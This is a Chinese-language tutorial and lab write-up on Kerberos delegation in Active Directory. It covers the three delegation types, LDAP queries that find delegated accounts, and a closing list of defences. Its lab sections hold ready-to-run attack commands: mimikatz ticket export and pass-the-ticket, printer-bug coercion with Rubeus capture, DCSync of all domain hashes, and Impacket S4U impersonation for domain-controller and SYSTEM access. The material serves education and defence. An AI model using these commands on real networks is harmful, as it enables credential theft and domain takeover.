# 委派

委派是大型网络中经常部署的应用模式，给多跳认证带来了很大的便利与此同时也带来了很大的安全隐患。利用委派，攻击者可结合其他漏洞进行组合攻击，导致攻击者可获取本地管理员权限甚至域管理员权限，还可以制作深度隐藏的后门。

委派是指将域内用户的权限委派给服务账户，使得服务账户能以用户权限访问域内的其他服务。

委派的流程图如图所示，域内用户A以Kerberos身份验证访问Web服务器请求下载文件，但是真正的文件在后台的文件服务器上。于是，Web服务器的服务账户会模拟域用户A，以Kerberos协议继续认证到后台的文件服务器。后台文件服务器将文件返回给Web服务器，Web服务器再将文件返回给域内用户A。这样就完成了一个委派的流程。

![图片.png](https://image.3001.net/images/20230621/1687331872_6492a4206322d88a8d34e.png!small)

在域内，只有主机账户和服务账户才具有委派的属性。

  * 主机账户就是活动目录Computers 中的计算机，也可以称其为机器账户

  * 服务账户是域内用户账户的一种类型，是将服务运行起来并加入域时所用的账户。列如，SQL Server 在安装时会在域内自动注册服务账户SQLServiceAccount，也可以将域用户通过注册SPN变为服务账户。

## 1\. 委派的分类

域内委派主要有三个类型：

  * 非约束性委派（Unconstrained Delegation ,UD）

  * 约束性委派（Constrained Delegation，CD）

  * 基于资源的约束性委派（Resource Based Constrained Delegation，RBCD）

我们来看一下这三种委派之间的联系和区别：

### 1\. 1 非约束性委派

在 Windows Server 2000 首次发布Active
Directory时，微软就提供了一种简单的机制来支持用户通过Kerberos向Web服务器进行身份验证，用户通过该机制可以更新后端数据库服务器上的记录。这就是最早的非约束性委派。对于非约束性委派，服务账户可以获取被委派用户的TGT，并将TGT缓存到lsass进程中，从而服务账户可使用该TGT模拟用户访问任意服务。非约束性委派的设置需要SeEnableDelegationPrivilege特权，该特权默认仅授予域管理员和企业管理员。

  * 配置了非约束性委派属性的机器账户的userAccountControl属性的Flag位为WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION,其对应的值是528384

  * 配置了非约束性委派属性的服务账户的userAccountControl属性Flag位为NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION,其对应的值为524800

 **注意** ：域控默认配置了非约束性委派

如图所示是约束性委派的流程图：

![图片.png](https://image.3001.net/images/20230621/1687331912_6492a4482103838868a35.png!small)

下面分析一下每一个步骤的含义：

1）用户通过发送一个KRB_AS_REQ的消息，向KDC的AS进行身份验证，请求一个可转发的TGT1  
2）KDC在KRB_AS_REP消息中返回了一个可转发的TGT1  
3）用户根据上一步获取的可转发的TGT1请求另一个可转发的TGT2，这一步是通过KRB_TGS_REQ消息请求的  
4）KDC在KRB_TGS_REP消息中为用户返回可转发的TGT2  
5）用户使用步骤2中返回的TGT1向KDC请求的服务1的ST  
6）KDC的TGS服务在KRB_TGS_REP消息中返回给用户服务1的ST  
7）用户发送KRB_AP_REQ的消息中包含TGT1和服务1的ST、TGT2、TGT2的Session Key  
8）服务1以用户的名义向KDC的TGS发送KRB_TGS_REQ,请求服务2的ST。请求中包含用户发过来的TGT2  
9）KDC的TGS服务在KRB_TGS_REP消息中返回服务2的ST给服务1，以及服务1可以使用的SessionKey。ST将客户端标识为用户，而不是服务1  
10）服务1以用户的名义向服务2发起KRB_AP_RE请求  
11）服务2响应服务1的KRB_AP_RE请求  
12）有了步骤11这个响应，服务1就可以响应步骤7中用户的KRB_AP_REQ  
13）这里的TGT转发委派机制没有限制服务1使用TGT2来申请哪个服务，所以服务1可以用户的名义向KDC申请任何其他服务的ST  
14）KDC返回步骤13中请求的ST  
15）服务1以用户的名义来请求其他服务  
16）服务N将像响应用户的请求一样响应服务1

在该流程中，TGT1请求的ST用于访问服务1，TGT2请求的ST用于访问服务2

从网络攻击者的角度来看，如果攻击者控制了服务1，则攻击者可以诱骗域管理员来访问服务1，然后攻击者可以在服务1机器上获取域管理员的TGT，从而可以用缓存的TGT模拟管理员访问任意的服务，包括域控。

### 1.2 约束性委派

由于非约束性委派的不安全性，微软在 Windows Server
2003中发布了约束性委派。对于约束性委派，服务账户只能获取该用户对指定的服务的ST。从而只能模拟该用户访问特定的服务。配置了约束性委派的账户的msDS-AllowedToDelegateTo属性会指定对哪个SPN进行委派。约束性委派的设置需要SeEnableDelegationPrivilege特权，该特权默认仅授予域管理员和企业管理员。

约束性委派有两种：一种是仅使用Kerberos，也就是不能进行协议转换；另一种是使用任何身份验证协议，也就是能进行协议转换。如图所示：

![图片.png](https://image.3001.net/images/20230621/1687331927_6492a4577273154a3d6dc.png!small)

（1）仅使用Kerberos

配置了仅使用Kerberos约束性委派的机器账户和服务账户的userAccountControl属性与正常账户一样，但是其msDS-AllowedToDelegateTo属性会有允许被委派服务的SPN

（2）使用任何身份验证协议

  * 配置了使用任何身份验证协议约束性委派的机器账户的userAccountControl属性的Flag位为WORKSTATION_TRUST_ACCOUNT | TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,其对应的值为16781312，并且其msDS-AllowedToDelegateTo属性会有允许被委派服务的SPN

  * 配置了使用任何身份验证协议约束性委派的服务账户的userAccountControl 属性的Flag 位为 NORMAL_ACCOUNT | TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,其对应的值为16777728，并且其其msDS-AllowedToDelegateTo属性会有允许被委派服务的SPN

（3）约束性委派的流程

为了在Kerberos协议层面对约束性委派进行支持，微软对Kerberos协议扩展了两个自协议：S4u2Self（Service for User to
Self）和 S4u2Proxy（Service for User to
Proxy）。S4u2Self可以代表任意用户请求针对自身的ST；S4uProxy可以以用户的名义请求针对其他指定服务的ST

如图所示是使用任何身份验证协议的约束性委派的流程图：

![图片.png](https://image.3001.net/images/20230621/1687331946_6492a46ade6d00087b399.png!small)

下面我们来逐步分析一下每一个步骤的含义：

1）用户向服务1发出请求，用户已通过身份验证，但服务1没有用户的授权数据，这通常是由于用户的身份验证是通过Kerberos以外（基于表单的Web认证、NTLM认证等）的其他方式验证的。  
2）服务1已经通过KDC进行了身份验证，并获得了TGT。它通过S4u2Self协议代表用户向KDC请求访问自身服务1的可转发ST  
3）KDC返回给服务1访问自身服务1的可转发ST1，就像是用户使用自己的TGT请求的一样，该可转发的ST1可能包含用户的授权数据  
4）服务1可以使用ST1中的授权数据来满足用户的请求，然后响应用户  
5）用户向服务1发出请求，请求访问服务2上的资源  
6）服务1利用S4u4Proxy 协议以用户的名义向KDC请求访问服务2的ST2，该请求中带上了可转发的ST1  
7）如果请求中存在PAC，则KDC通过检查PAC结构的签名数据来验证PAC。如果PAC有效或不存在，KDC返回给服务2的可转发ST2，并且存储在ST2的cname和crealm字段中的客户端标识是用户，而不是服务1  
8）服务1以用户身份使用可转发ST2向服务2发起请求  
9）服务2响应步骤8中的请求  
10）服务1响应步骤5中的请求

从网络攻击者的角度来看，如果攻击者控制了服务1的账户，并且服务1配置了到域控的CIFS的约束性委派，则可以利用服务1以任意用户权限（包括域管理员）访问域控的CIFS，即相当于控制了域控

整个流程简化后如图所示：

![图片.png](https://image.3001.net/images/20230621/1687331961_6492a479909920b5cc4ac.png!small)

1）S4u2Self。当用户以其他方式如NTLM认证、基于表单的认证等与Web服务进行认证后，无法向Web服务器提供请求服务的ST，因此服务器也无法进一步使用S4u2Proxy协议请求访问服务B

S4u2Self协议便是解决该问题的方案，被配置为约束性委派的服务账户能够调用S4u2Self协议向KDC申请为任意用户请求访问自身的可转发ST

 **注意** ：虽然S4u2Self协议允许服务代表用户向KDC请求访问自身服务的ST，但是此协议扩展不允许服务代表用户向KDC请求访问其他服务的ST

2）S4u2Proxy。S4u2Proxy可以用上一步获得的可转发ST以用户的名义请求针对其他指定服务的ST。S4u2Proxy使得服务A可以使用自用户hack的授权，然后以用户hack的身份向KDC请求访问服务B的ST。需要特别说明的是，服务使用S4u2Proxy协议代表用户获得针对服务自身ST的过程是不需要用户凭据的

### 1.3 基于资源的约束性委派

为了使用户和资源更加独立，微软在Windows Server 2012
中引入了基于资源的约束性委派。基于资源的约束性委派不需要域管理员权限去设置，而是把设置属性的权限赋予了机器自身。基于资源的约束性委派允许受信任的账户委派给自身。基于资源的约束性委派只能运行在Windows
Server 2012 和 Windows Server 2012
R2及以上的域控上进行配置，但可以在混合模式的林中应用。配置了基于资源的约束性委派账户的msDS-AllowedToActOnBehalfOfOtherIdentity属性的值为被允许委派账户的SID，并且被委派属性这里没有任何值。

（1）基于资源的约束性委派流程图：

整个流程如图所示：

![图片.png](https://image.3001.net/images/20230621/1687331974_6492a486daaf31155eaf9.png!small)

整个流程如下：

1）服务A使用自己的服务账户和密码向KDC申请一个可转发的TGT  
2）服务A利用S4u2Self协议代表用户申请一个访问自身的ST。这一步区别于传统的约束性委派。在S4uSelf协议中提到，返回的ST可转发的一个条件是服务A配置了传统的约束性委派。KDC会检查服务A的msDS-AllowedToDelegateTo字段，如果这个字段被赋值了，则KDC返回可转发的ST。但是由于这里是基于资源的约束性委派，是在服务B上配置的，服务B的msDS-AllowedToActOnBehalfOfOtherIdentity属性配置了服务A的SID，服务A并没有配置msDS-AllowedToDelegateTo字段，因此KDC返回的ST是不可转发的  
3）服务A利用S4u2Proxy协议以用户身份向KDC请求访问服务B的可转发ST（上一步获得的不可转发ST放在请求包的AddtionTicket中）。KDC返回访问服务B的可转发ST。  
4）服务A用上一步获得可转发ST访问服务B

（2）谁拥有配置基于资源的约束性委派的权限

由前面可知，配置了基于资源的约束性委派账户的msDS-AllowedToActOnBehalfOfOtherIdentity属性的值为被允许委派账户的SID。那么，谁能修改msDS-AllowedToActOnBehalfOfOtherIdentity属性，就说明谁拥有配置基于资源的约束性委派的权限

在域控上执行如下的命令，查询指定域内机器WIN10的msDS-AllowedToActOnBehalfOfOtherIdentity属性，如图，可以发现默认情况下没有该属性

    
    
    AdFind.exe -f "&(objectcategory=computer)(name=WIN10)" msDS-AllowedToActOnBehalfOfOtherIdentity
    

![图片.png](https://image.3001.net/images/20230621/1687332007_6492a4a75b4ed322a7067.png!small)

也就是说，谁能添加机器账户的msDS-AllowedToActOnBehalfOfOtherIdentity属性，谁就能配置基于资源的约束性委派。我们使用Adfind执行如下的命令，查询WIN10机器的ACL，看哪些用户修改属性的权限，如图所示，可以看到除了用户administrator外，用户hack\hack
和 SELF 自身拥有修改属性的权限

    
    
    Adfind.exe -b CN=WIN10,CN=Computers,DC=hack,DC=com -sc getacl -sddl+++ -sddlfilter ;;"WRT PROP";;;
    

![图片.png](https://image.3001.net/images/20230621/1687332023_6492a4b771127f396169d.png!small)

administrator和SELF拥有修改属性的权限好理解，为什么用户hack\hack也能拥有修改属性的权限呢？这是因为机器WIN10是通过用户hack\hack加入域的，因此用户hack\hack也拥有修改机器WIN10属性的权限，且机器WIN10的ms-DS-CreaterSID属性的值为用户hack\hack的SID

也就是说，除了传统的域管理员等高权限用户外，机器自身和将机器加入域的域用户拥有修改机器msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限，也就是拥有配置基于资源的约束性委派的权限

（3）基于资源的约束性委派的优势

基于资源的约束性委派相比其他两种类型的委派的优势如下：

  * 委派的授予权限给了拥有资源的后端，而不是前端。不再需要域管理员权限设置，只需要拥有在计算机对象上编辑msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限，也就是将机器加入域的域用户和机器在自身都拥有该权限。

  * 约束性委派不能跨域进行委派，而基于资源的约束性委派可以跨域和林

（4）约束性委派和基于资源的约束性委派配置的差别

  * 传统的约束性委派是“正向的”，通过修改服务账户的msDS-AllowedToActOnBehalfOfOtherIdentity属性，添加服务B的SPN，设置约束性委派对象为服务B，服务A便可以模拟任意用户向域控请求访问服务B的ST

  * 而基于资源的约束性委派则相反，通过修改服务B的msDS-AllowedToActOnBehalfOfOtherIdentity属性，添加服务A的SID，以达到让服务A模拟任意用户访问服务B资源的目的

（5）基于资源的约束性委派攻击

该攻击是有国外安全研究员Elad Shami
提出的，他在文章中指出无论服务账户的UserAccountControl属性是否被设置为TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION值，服务自身都可以通过调用S4uSelf来为任意用户请求自身的服务票据。但是当没有设置该属性时，KDC通过检查账户的msDS-AllowedToActOnBehalfOfOtherIdentity字段，发现没有被赋值，所以服务自身通过S4uSelf请求到的ST是不可转发的，因此是无法通过S4u2Proxy协议转发到其他服务进行约束性委派认证。但是，在基于资源的约束性委派的过程中，不可转发的ST仍然可以通过S4u2Proxy协议转发到其他服务进行约束性委派认证，并且服务还会返回可转发的ST，这是微软的设计缺陷

因此，如果我们能够在服务B上配置允许服务A的基于资源的约束性委派，那么可以通过控制服务A使用S4uSelf协议向域控请求任意用户访问自身的ST，最后再使用S4u2Proxy协议转发此ST去请求访问服务B的可转发ST，我们就可以模拟任意用户访问服务B了。而这里我们控制的服务A可以普通域用户的身份去创建机器账户。

要想进行基于资源的约束性委派攻击，需要具备以下两个条件：

  * 拥有服务A的权限，这里只需要拥有一个普通的域账户权限即可，因为普通的域账户默认最多可以创建10个机器账户，机器账户可以作为服务账户使用

  * 拥有在服务B上配置允许服务A的基于资源的约束性委派的权限，即拥有修改服务B的msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限。机器账户自身和创建机器账户的用户拥有该权限

## 2\. 查询具有委派属性的账户

查询域中具有委派属性的账户可以使用LDAP，通过过滤userAccountControl属性筛选出服务账户和机器账户，机器账户samAccountType=805306369，而服务账户samAccountType=805306368，再通过AllowedToDelegateTo和AllowedToActOnBehalfOfOtherIdentity属性筛选出不同的委派。

### 2.1 查询非约束委派的主机或服务账户

查询非约束委派的主机或服务账户可以使用Powershell脚本、Adfind或Ldapsearch工具等

（1）PowerShell脚本

利用PowerSploit下的PowerView.ps1脚本查询，命令如下：

    
    
    Import-Module .\PowerView.ps1
    #查询域中配置了非约束性委派的主机
    Get-NetComputer -Unconstrained -Domain hack.com
    #查询域中配置了非约束性委派的服务账户
    Get-NetUser -Unconstrained -Domain hack.com | select name
    

（2）Adfind

利用Adfind过滤samAccountType 和 userAccountControl属性，命令如下：

    
    
    #查询域中配置了约束性委派的主机
    AdFind.exe -b "DC=hack,DC=com" -f "(&(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
    #查询域中配置了非约束性委派的服务账户
    AdFind.exe -b "DC=hack,DC=com" -f "(&(samAccountType=805306368) (userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
    

（3）Ldapsearch

利用Ldapsearch过滤samAccountType 和 userAccountControl属性，命令如下：

    
    
    #查询域中配置了约束性委派的主机
    ldapsearch -x -H ldap://192.168.41.10:389 -D "hack@hack.com" -w Admin123 -b "DC=hack,DC=com" "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep dn
    #查询域中配置了非约束性委派的服务账户
    ldapsearch -x -H ldap://192.168.41.10:389 -D "hack@hack.com" -w Admin123 -b "DC=hack,DC=com" "(&(samAccountType=805306368) (userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep dn
    

### 2.2 查询约束性委派的主机或服务账户

查询束性委派的主机或服务账户同样可以使用Powershell脚本、Adfind或Ldapsearch工具等

（1）PowerShell脚本

利用Empire下的PowerView.ps1脚本查询，命令如下：

    
    
    Import-Module .\PowerView.ps1
    #查询域中配置了约束性委派的主机
    Get-DomainComputer -TrustedToAuth -Domain hack.com | select name,msds-allowedtodelegateto
    #查询域中配置了约束性委派的服务账户
    Get-DomainUser -TrustedToAuth -Domain hack.com | select name,msds-allowedtodelegateto
    

（2）Adfind

利用Adfind过滤samAccountType 和 userAccountControl属性，命令如下：

    
    
    #查询域中配置了约束性委派的主机，并可以看到被委派的SPN
    AdFind.exe -b "DC=hack,DC=com" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
    #查询域中配置了约束性委派的服务账户，并可以看到被委派的SPN
    AdFind.exe -b "DC=hack,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))"  msds-allowedtodelegateto
    

（3）Ldapsearch

利用Ldapsearch过滤samAccountType 和 userAccountControl属性，命令如下：

    
    
    #查询域中配置了约束性委派的主机，并可以看到被委派的SPN
    ldapsearch -x -H ldap://192.168.41.10:389 -D "hack@hack.com" -w Admin123 -b "DC=hack,DC=com" "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" | grep -e dn -e msDS-AllowedToDelegateTo
    #查询域中配置了约束性委派的服务账户，并可以看到被委派的SPN
    ldapsearch -x -H ldap://192.168.41.10:389 -D "hack@hack.com" -w Admin123 -b "DC=hack,DC=com" "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" | grep -e dn -e msDS-AllowedToDelegateTo
    

### 2.3 查询基于资源的约束性委派的主机或服务账户

（1）Adfind

利用Adfind过滤samAccountType和msDS-AllowedToActOnBehalfOfOtherIdentity属性，命令如下。使用Adfind查询出来的msDS-AllowedToActOnBehalfOfOtherIdentity值用{Security
Descriptor}代替，这个值包含允许被委派的服务账户或机器账户的SID

    
    
    #查询域中配置了基于资源的约束性委派的主机
    Adfind.exe -b ”DC=hack，DC=com" -f "(&(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" msDS-AllowedToActOnBehalfOfOtherIdentity
    #查询域中配置了基于资源的约束性委派的服务账户
    Adfind.exe -b ”DC=hack，DC=com" -f "(&(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" msDS-AllowedToActOnBehalfOfOtherIdentity
    

（2）Ldapsearch

利用Ldapsearch过滤samAccountType和msDS-AllowedToActOnBehalfOfOtherIdentity属性，命令如下。

    
    
    #查询域中配置了基于资源的约束性委派的主机
    Ldapsearch -x -H ldap://192.168.41.10:389 -D "hack@hack.com" -w Admin123  -b "DC=hack,DC=com" "(&(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" | grep dn
    #查询域中配置了基于资源的约束性委派的服务账户
    Ldapsearch -x -H ldap://192.168.41.10:389 -D "hack@hack.com" -w Admin123  -b "DC=hack,DC=com" "(&(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" | grep dn
    

### 2.4 查看某账户是否具有委派性

通过使用Empire下的PowerView.ps1脚本查看服务账户或机器账户的属性，进而查看某账户是否具有委派的属性。

    
    
    Import-Module .\PowerView.ps1
    #查询非约束性委派和约束性委派
    Get-DomainUser 域账户名 -Properties useraccountcontrol，msds-allowedtodelegation | fl
    Get-DomainComputer 机器账户名 -Properties useraccountcontrol，msds-allowedtodelegation | fl
    #查询基于资源的约束性委派
    Get-DomainUser 域账户名 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
    Get-DomainComputer 机器账户名 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
    

当该账户没有委派的属性时，只有userAccountControl属性有值

  * 服务账户的值为NORMAL_ACCOUNT

  * 机器账户的值为WORKSTATION_TRUST_ACCOUNT

## 3\. 委派攻击实验

委派攻击发生在Kerberos协议的TGS-REQ&TGS-REP阶段，可以分为非约束性委派攻击、约束性委派攻击和基于资源的约束性委派攻击

### 3.1 非约束性委派攻击

实验环境如下：

  * 域控：DC（192.168.41.10）

  * 域成员主机：WIN10(192.168.41.20)

  * 域管理员：Administrator

  * 域普通用户：hack

  * 域：hack.com

如图所示在域控上配置了主机WIN10具有非约束性委派的属性

![图片.png](https://image.3001.net/images/20230621/1687332054_6492a4d62129b2a588be1.png!small)

配置完成后，查询域内具有非约束性委派的主机账户，如图所示，可以看到WIN10机器

    
    
    Import-Module .\PowerView.ps1
    #查询域中配置了非约束性委派的主机
    Get-NetComputer -Unconstrained -Domain hack.com
    

![图片.png](https://image.3001.net/images/20230621/1687332071_6492a4e79a6e9af133861.png!small)

**注意** ：默认域控配置了非约束性委派

正常情况下在WIN10上访问域控，会提示拒绝，如图所示：

![图片.png](https://image.3001.net/images/20230621/1687332083_6492a4f38166dfafd32e9.png!small)

（1）诱使域管理员访问机器

此时我们用域管理员Administrator身份在域控上远程访问WIN10机器，比如使用Administrator账户远程IPC连接WIN10，命令如下：

    
    
    net use \\WIN10.hack.com /user:hack\Administrator Admin123
    

![图片.png](https://image.3001.net/images/20230621/1687332102_6492a5069ec62882416e7.png!small)

此时，在主机WIN10的lsass.exe内存中就会有域管理员的Administrator的TGT票据。我们在WIN10上以管理员权限运行mimikatz，执行如下的命令导出内存中的票据：

    
    
    privilege::debug
    #导出票据
    sekurlsa::tickets /export
    

可以看到会生成一个Administrator@Krbtgt的票据，如图所示：

![图片.png](https://image.3001.net/images/20230621/1687332115_6492a513708e70ce6c336.png!small)

然后我们利用mimikatz将这个票据导入内存后，成功访问域控，如图所示：

    
    
    #导入票据
    kerberos::ptt [0.1071f70]-2-0-60a10000-Administrator@krbtgt-HACK.COM.kirbi
    #查看票据
    kerberos::list
    

![图片.png](https://image.3001.net/images/20230621/1687332132_6492a5241244d235594e1.png!small)

![图片.png](https://image.3001.net/images/20230621/1687332139_6492a52b98f469be7499d.png!small)

(2) 结合打印机漏洞攻击

上面的攻击手段，还需要域管理员主动连接配置了非约束性委派的主机，才能从该主机上取得域管理员的TGT，实战中的意义并不大。于是，我们可以利用打印机服务漏洞来强制域控连接配置了非约束性委派的主机，也能从该主机上抓到域控机器账户的TGT，且不需要域管理员进行交互。

首先在WIN10上以管理员权限用Rubeus每隔一秒监听一次来自DC主机的票据，命令如下：

    
    
    Rubeus.exe monitor /interval:1 /filteruser:DC$
    

![图片.png](https://image.3001.net/images/20230621/1687332153_6492a539d9d5f13b877e5.png!small)

然后在WIN10上使用打印机漏洞漏洞攻击域控DC，命令如下，使其强制回连认证WIN10主机，如图所示：

    
    
    SpoolSample.exe DC WIN10
    

![图片.png](https://image.3001.net/images/20230621/1687332165_6492a545dfcbaf83baacd.png!small)

此时可以看到Rebeus已经收到了来自DC的base64的TGT了，如图所示：

![图片.png](https://image.3001.net/images/20230621/1687332180_6492a554c80279089bac3.png!small)

然后直接使用Rubeus导入这个base64格式的TGT，命令如下，就可以使用mimikatz导出域内所用用户的Hash了

    
    
    Rubeus.exe ptt /ticket:base64 格式的票据
    #导出域内所有用户的Hash
    mimikatz.exe "lsadump::dcsync /all /csv" "exit"
    

![图片.png](https://image.3001.net/images/20230621/1687332196_6492a56483ed25bbd8047.png!small)

![图片.png](https://image.3001.net/images/20230621/1687332204_6492a56c2576141cb9267.png!small)

**注意** ：域控机器账户不能用于登陆，但是具有DCSync权限，所以可以用于导出域内用户的Hash

### 3.2 约束性委派攻击

实验环境如下：

  * 域控：DC(192.168.41.10)

  * 域成员主机：WIN10(192.168.41.20)

  * 域管理员：Administrator

  * 服务账户：test

  * 域：hack.com

(1) 添加服务账户

服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL等；域用户通过注册SPN也能成为服务账号

    
    
    #创建一个普通用户
    net user test Admin@123 /add /domain
    #注册为服务账号 
    setspn -U -A priv/test test 
    

![图片.png](https://image.3001.net/images/20230621/1687332217_6492a5797bd78177924ab.png!small)

(2) 配置约束性委派

首先在域控上修改服务账户test的委派属性为约束性委派，类型为“使用任何身份认证协议”，允许委派的SPN为域控DC的CIFS，如图所示：

![图片.png](https://image.3001.net/images/20230621/1687332228_6492a58481d6cf3c53b6b.png!small)

3）约束性委派攻击复现

此时我们获得了域内主机WIN10的权限，该主机当前登陆用户为hack\test，抓取到其的密码为Admin@123，然后通过Adfind查询发现用户test被赋予了约束性委派的属性，命令如下，并且委派的SPN是cifs/DC.hack.com,如图所示：

    
    
    #查询域中配置了约束性委派的服务账户，并可以看到被委派的SPN
    AdFind.exe -b "DC=hack,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))"  msds-allowedtodelegateto
    

![图片.png](https://image.3001.net/images/20230621/1687332251_6492a59b7ce8bca9d00e1.png!small)

然后我们就可以进行约束性委派攻击了，这里我们使用Impacket进行约束性委派攻击

首先我们需要执行如下的命令进行攻击，如图所示，可以看到执行完这些命令后，就可以远程连接域控了

    
    
    #以域管理员Administrator身份请求一张访问cifs/DC.hack.com服务的票据
    python3 getST.py -dc-ip 192.168.41.10 hack.com/test:Admin@123 -spn cifs/DC.hack.com -impersonate Administrator
    #导入票据
    export KRB5CCNAME=Administrator.ccahe
    #远程访问域控
    python3 smbexec.py -no-pass -k 192.168.41.10
    

![图片.png](https://image.3001.net/images/20230621/1687332268_6492a5aca49c61c607bae.png!small)

### 3.3 基于资源的约束性委派攻击

实验环境如下：

  * 域控：DC（192.168.41.10）

  * 域成员主机：WIN10(192.168.41.20)

  * 域用户：hack

  * 域管理员：Administrator

  * 域：hack.com

（1）基于资源的约束性委派攻击复现

如图所示我们已经获得了域内主机WIN10的普通域账户权限（hack\hack）,但是该域用户不在WIN10的管理员组中，因此无法执行mimikatz等高权限的操作现在我们需要利用基于资源的约束性委派进行本地提权，获得WIN10的主机的System权限

    
    
    #查询主机名称
    hostname
    #查询当前用户
    whoami
    #查询WIN10的管理员组
    net localgroup administrators
    

![图片.png](https://image.3001.net/images/20230621/1687332288_6492a5c09dc2b1e99e7e8.png!small)

通过LDAP查询域内机器账户的创建者，我们发现，机器WIN10.hack.com的创建者为用户hack,也就是当前登录的用户

    
    
    #查询将机器加入域的用户
    GetCreator.exe LDAP://hack.com
    

因此，用户hack拥有给WIN10机器配置于基于资源的约束性委派的权限，于是我们可以创建一个机器账户machine$，密码为root，然后配置新建的机器账户machine$到WIN10机器基于资源的约束性委派:

    
    
    #添加机器用户对于某主机的基于资源的约束性委派
    add_rbcd.exe domain=hack.com dc=DC.hack.com tm=WIN10 ma=machine mp=root
    

配置完成后，我们就可以使用Impacket进行基于资源的约束性委派攻击了

执行如下的命令进行攻击，如图所示，可以看到执行完这些命令后，成功获得了WIN10机器的System权限

    
    
    #以域管理员Administrator身份请求一张访问cifs/WIN10.hack.com服务的票据
    python3 getST.py -dc-ip DC.hack.com hack.com/macine$:root -spn cifs/WIN10.hack.com -impersonate administrator
    #导入票据
    export KRB5CCNAME=Administrator.ccahe
    #远程访问WIN10.hack.com机器
    python3 smbexec.py -no-pass -k WIN10.hack.com
    

![图片.png](https://image.3001.net/images/20230621/1687332305_6492a5d19326e3e44829c.png!small)

![图片.png](https://image.3001.net/images/20230621/1687332356_6492a6048517160bd974b.png!small)

![图片.png](https://image.3001.net/images/20230621/1687332365_6492a60d34b30fdeafb10.png!small)

## 4\. 委派攻击防御

对于防守方或蓝队来说，如何针对委派攻击进行防御呢？总的来说，有以下几点：

  * 高权限的用户设置不能被委派，如图所示，设置用户Administrator不能被委派

![图片.png](https://image.3001.net/images/20230621/1687332383_6492a61fea55e74a57ac8.png!small)

  * 主机账户需要设置为委派时，只能设置为约束性委派

  * Winodws 2012 R2 及跟高版本的系统创建了受保护的用户组（Protected Users），该组内的用户不允许被委派，将需要被保护的服务账户加入改组即可。

